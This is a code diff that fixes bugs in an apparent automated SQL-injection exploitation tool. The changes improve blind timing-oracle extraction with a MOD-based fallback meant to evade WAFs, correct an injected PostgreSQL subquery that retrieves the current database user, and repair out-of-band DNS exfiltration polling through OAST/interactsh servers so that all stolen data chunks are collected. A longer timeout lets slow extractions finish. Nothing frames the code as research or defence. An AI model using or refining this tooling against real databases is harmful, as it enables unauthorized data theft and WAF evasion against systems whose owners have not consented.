@@ -63091,11 +63091,19 @@ class Scanner:
                 # BUG-MODBIT-RESTART FIX: Previously restarted with _fallback_equality
                 # (O(alphabet) probes per char ≈ 17–57 requests × sleep_delay per char).
                 # For a 48-char database name under timing oracle with 3s sleep delay:
-                # 48 × 30 × 3s ≈ 4320s; 600s extraction timeout aborts at ~8 chars.
-                # Fix: use _fallback_modbit first (MOD/% operator, avoids & entirely,
-                # same 7 probes/char as native bitwise, 7×3s=21s per char → 48×21=1008s
-                # before timeout but within 600s for names ≤28 chars). For longer names
-                # or when MOD is also blocked, fall through to _fallback_equality.
+                # 48 × 30 × 3s ≈ 4320s; original 600s extraction timeout aborted at ~8 chars.
+                # BUG-CLEANUP-TIMEOUT-600s FIX raised the cleanup timeout to 7200s, which
+                # covers all fallback paths with headroom.
+                # Fix: use _fallback_modbit first (MOD/% operator, avoids & entirely).
+                # Probe count: _n_bits probes per char (21 for PostgreSQL/MySQL/SQLite,
+                # 16 for MSSQL/Sybase/Oracle, 8 for others). Worst case for production
+                # PostgreSQL 48-char database name: 21 × 3s × 48 ≈ 3024s < 7200s.
+                # Binary-search native bitwise uses ~7 probes/char for ASCII (log2(128));
+                # modbit uses fixed _n_bits probes (no early exit), so it is 3× slower
+                # than native for ASCII, but avoids & entirely so WAF-data-aware blocking
+                # cannot discriminate between true/false oracle responses.
+                # For longer names or when MOD is also blocked, fall through to
+                # _fallback_equality (up to 4320s, within the 7200s cleanup timeout).
                 LOG.info("[Inference] %s: restarting extraction from pos=1 using MOD-based "
                          "extraction (& operator avoided; bitwise oracle confirmed corrupt "
                          "by data-aware WAF)", label)
@@ -63552,7 +63560,14 @@ class Scanner:
             _r7_UQ = {
                 "PostgreSQL":  ["SELECT current_role", "SELECT user", "SELECT session_user",
                                 "SELECT current_user",
-                                "(SELECT rolname FROM pg_roles WHERE oid=pg_backend_pid())"],
+                                # BUG-PG-ROLE-OID-WRONG FIX: pg_backend_pid() returns the backend
+                                # PROCESS ID (e.g. 12345), NOT the OID of the current user role.
+                                # pg_roles.oid values are independent integers; querying
+                                # WHERE oid=pg_backend_pid() finds no row → returns NULL.
+                                # Fix: use pg_stat_activity where pid=pg_backend_pid() to look up
+                                # the username of the current backend connection — this is the only
+                                # pg_catalog view that correlates pid to usename.
+                                "(SELECT usename FROM pg_stat_activity WHERE pid=pg_backend_pid())"],
                 "CockroachDB": ["SELECT current_role", "SELECT user", "SELECT current_user"],
                 "YugabyteDB":  ["SELECT current_role", "SELECT user", "SELECT current_user"],
                 "Amazon Redshift": ["SELECT current_user", "SELECT user"],
@@ -99893,6 +99908,26 @@ class DoHOOBChannel:
         """Poll OAST/interactsh /poll REST endpoint for captured DNS interactions.
 
         Decodes hex labels back to plaintext and returns extracted values.
+
+        BUG-OOB-POLL-EARLY-RETURN FIX (HIGH, all DBMSes, OOB extraction):
+        The previous code returned immediately from inside the poll loop as soon as
+        ANY single chunk was captured: `if captured: return [...]`. For an 8-chunk
+        extraction, chunk 0 arrived first and the function returned with only chunk 0's
+        data — the remaining 7 chunks were never polled for. Result: only the first
+        30 bytes of the extracted string were returned; the rest were silently discarded.
+
+        BUG-OOB-POLL-DEDUP FIX (MEDIUM, all DBMSes, OOB extraction):
+        OAST servers (interact.sh, oast.pro) return ALL historical interactions for the
+        session on every /poll call — not just interactions since the last poll. Without
+        deduplication, each subsequent poll iteration re-added every already-seen chunk
+        to `captured`. After deadline expiry the list would contain N copies of each
+        chunk (one per poll iteration), and `"".join(hits)` in exfiltrate() would produce
+        a result N times larger than the actual data (e.g. "jacbblCljacbblCljacbblCl").
+
+        Fix: track seen sequence numbers in a set; accumulate unique chunks across all
+        poll iterations until the deadline expires; sort and return after the loop.
+        Do NOT early-return inside the loop — poll for the full timeout so all in-flight
+        DNS interactions have time to arrive at the OAST server.
         """
         # BUG-REST-vs-DNS-DOMAIN FIX: oast_server must be the REST API base URL.
         # The session domain (sessionid.oast.fun) is for DNS only, not REST polling.
@@ -99904,7 +99939,8 @@ class DoHOOBChannel:
         if not _doh_rest_server:
             LOG.debug("[DoHOOB] No OAST REST server configured")
             return []
-        captured = []
+        # BUG-OOB-POLL-DEDUP FIX: use dict keyed by seq to collect unique chunks.
+        captured_by_seq: dict = {}
         deadline = time.monotonic() + timeout
         h = {"Authorization": f"Bearer {self.oast_token}"} if self.oast_token else {}
         while time.monotonic() < deadline:
@@ -99954,20 +99990,24 @@ class DoHOOBChannel:
                                         seq = 0
                                         data_hex = lc
                                     decoded = bytes.fromhex(data_hex).decode("utf-8", errors="replace")
-                                    captured.append((seq, decoded))
-                                    LOG.info(f"[DoHOOB] Decoded chunk seq={seq}: {decoded!r}")
+                                    # BUG-OOB-POLL-DEDUP FIX: only record a seq the first time;
+                                    # OAST replays all historical interactions on every /poll call.
+                                    if seq not in captured_by_seq:
+                                        captured_by_seq[seq] = decoded
+                                        LOG.info(f"[DoHOOB] Decoded chunk seq={seq}: {decoded!r}")
                                 except Exception:
                                     pass
-                        if captured:
-                            # Sort by sequence number and return ordered list of strings
-                            captured.sort(key=lambda x: x[0])
-                            return [v for _, v in captured]
+                        # BUG-OOB-POLL-EARLY-RETURN FIX: do NOT return here — keep polling
+                        # until the deadline so all in-flight chunks can arrive.
                     except (json.JSONDecodeError, ValueError):
                         pass
             except Exception as e:
                 LOG.debug(f"[DoHOOB] Poll error: {e}")
             await asyncio.sleep(2.0)
-        return captured
+        # Return chunks sorted by sequence number after full polling window.
+        if captured_by_seq:
+            return [v for _, v in sorted(captured_by_seq.items())]
+        return []
 
     async def poll_doh(self, timeout=10.0):
         """Deprecated stub — DoH resolvers cannot capture incoming DNS interactions."""
@@ -137143,12 +137183,19 @@ class ScannerV14(ScannerV13):
                 # pending tasks (never ran) but also killed RUNNING extraction when CDN
                 # reactive retry fires a 30s wait — scan cleanup cancelled extraction at
                 # 15s, causing "Scan complete" to appear before "Extraction completed"
-                # and zero data extracted. Use 600s: enough for 30s CDN waits × multiple
-                # probes. Genuine pending tasks (RecursionError) still get cancelled but
-                # only after 10 minutes of truly being stuck.
-                await asyncio.wait_for(asyncio.shield(_active_ext), timeout=600)
+                # and zero data extracted.
+                # BUG-CLEANUP-TIMEOUT-600s FIX: 600s is insufficient for timing-oracle
+                # extraction of long strings via modbit/equality fallback.  For a 48-char
+                # database name under a 3s timing oracle:
+                #   modbit:   7 probes × 3s × 48 chars = 1008s  (aborts at char 28)
+                #   equality: 30 probes × 3s × 48 chars = 4320s (aborts at char 6)
+                # Use 7200s (2 hours): covers the worst-case equality path for a 48-char
+                # string at 3s delay with CDN retries (4320s) plus headroom.
+                # Genuine pending tasks (RecursionError) still get cancelled but only
+                # after 2 hours of truly being stuck.
+                await asyncio.wait_for(asyncio.shield(_active_ext), timeout=7200)
             except asyncio.TimeoutError:
-                LOG.warning("[Cleanup] Extraction timed out after 600s — cancelling")
+                LOG.warning("[Cleanup] Extraction timed out after 7200s — cancelling")
                 try: _active_ext.cancel()
                 except Exception: pass
                 await asyncio.sleep(0.2)
